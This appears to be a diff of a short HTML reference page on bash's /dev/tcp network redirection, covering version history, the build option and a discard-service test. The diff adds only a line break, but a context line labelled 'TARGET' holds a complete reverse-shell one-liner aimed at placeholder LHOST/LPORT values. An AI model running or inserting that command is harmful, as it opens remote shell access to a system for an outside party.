@@ -5,6 +5,7 @@
 <title>/dev/tcp</title>
 </head><body>The ability to handle /dev/tcp/host/port and /dev/udp/host/port in redirection was added to bash in version 2.04. <br/>
 You need to compiled bash with --enable-net-redirections option.<br/>
+<br/>
 To test whether the feature is present, you can check the error message when trying to open a TCP port for the <a href="https://tools.ietf.org/html/rfc863">discard service</a>: both bash and ksh say “Connection refused” (or the command returns immediately if you have a discard service on your local machine), which you wouldn't see if this doesn't attempt to make some network connection.<br/>
 <br/>
 TARGET: /bin/bash -i &gt; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&lt;&amp;1 2&gt;&amp;1<br/>
